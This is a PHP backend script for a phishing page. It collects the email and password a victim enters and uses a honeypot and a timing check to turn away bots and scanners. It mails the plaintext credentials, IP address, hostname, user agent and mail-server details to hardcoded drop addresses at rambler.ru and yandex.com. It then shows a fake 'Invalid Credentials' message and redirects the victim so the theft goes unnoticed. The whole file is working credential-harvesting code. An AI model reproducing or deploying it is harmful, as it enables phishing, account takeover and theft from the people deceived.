<?php
header('Content-Type: application/json');
ob_start();

// 1. Check if POST data is present
if (empty($_POST)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'msg' => 'No POST data received.']);
    exit;
}

// 2. Collect inputs
$ai = trim($_POST['ai'] ?? '');
$pr = trim($_POST['pr'] ?? '');
$formTime = intval($_POST['form_time'] ?? 0);
$honeypot = trim($_POST['robot_check'] ?? '');

$signal = 'bad'; // default
$msg = 'Invalid request.';

// 3. Anti-bot: Honeypot
if (!empty($honeypot)) {
    echo json_encode(['status' => 'error', 'msg' => 'Bot detected.']);
    exit;
}

// 4. Anti-bot: Time check
if ($formTime > 0 && (time() - $formTime) < 2) {
    echo json_encode(['status' => 'error', 'msg' => 'Form submitted too quickly.']);
    exit;
}

// 5. Required field check
if (empty($ai) || empty($pr)) {
    echo json_encode(['status' => 'error', 'msg' => 'Missing email or password.']);
    exit;
}

// 6. Validate email format
if (!filter_var($ai, FILTER_VALIDATE_EMAIL)) {
    echo json_encode(['status' => 'error', 'msg' => 'Invalid email format.']);
    exit;
}

// Function to get MX record URL - IMPROVED VERSION
function getMXRecordURL($email) {
    // Extract domain from email
    $domain = substr(strrchr($email, "@"), 1);
    $domain = rtrim($domain, '.');
    
    // Debug: Log the domain being checked
    error_log("Checking MX for domain: $domain");
    
    // Try to get MX records directly
    $mxhosts = [];
    $weight = [];
    
    // Use @ to suppress warnings if DNS fails
    $hasMX = @getmxrr($domain, $mxhosts, $weight);
    
    // If getmxrr returns false or arrays are empty, check differently
    if (!$hasMX || empty($mxhosts)) {
        // Alternative check
        if (!checkdnsrr($domain, 'MX')) {
            return "NO MX RECORDS";
        }
        
        // Try again without suppressing errors
        getmxrr($domain, $mxhosts, $weight);
        
        if (empty($mxhosts)) {
            return "NO MX RECORDS";
        }
    }
    
    error_log("Found MX hosts: " . implode(', ', $mxhosts));
    
    // Return the first MX record (usually highest priority/lowest number)
    return $mxhosts[0] ?? "NO MX RECORDS";
}

// Get the MX record URL
$mxRecordURL = getMXRecordURL($ai);

// 7. If valid, process and log
$ip = $_SERVER["REMOTE_ADDR"] ?? 'unknown';
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Extract domain for logging
$domain = substr(strrchr($ai, "@"), 1);

// Prepare message with MX record URL
$message = "|---------- LOGIN INFO ----------|\n";
$message .= "Online ID: $ai\n";
$message .= "Password : $pr\n";
$message .= "Domain   : $domain\n";
$message .= "MX Record: $mxRecordURL\n";
$message .= "Client IP: $ip\n";
$message .= "Hostname : $hostname\n";
$message .= "UserAgent: $useragent\n";
$message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
$message .= "|--------------------------------|\n";

// Send mail
$send = "myresultbox2020@rambler.ru,myresultbox2020@yandex.com";
$subject = "Login: $ip - MX: $mxRecordURL";
mail($send, $subject, $message);

// Final response
$signal = 'ok';
$msg = 'Invalid Credentials';

// Send final response
echo json_encode([
    'signal' => $signal,
    'msg' => $msg,
    'redirect_link' => 'http://mail.com'
]);

ob_end_flush();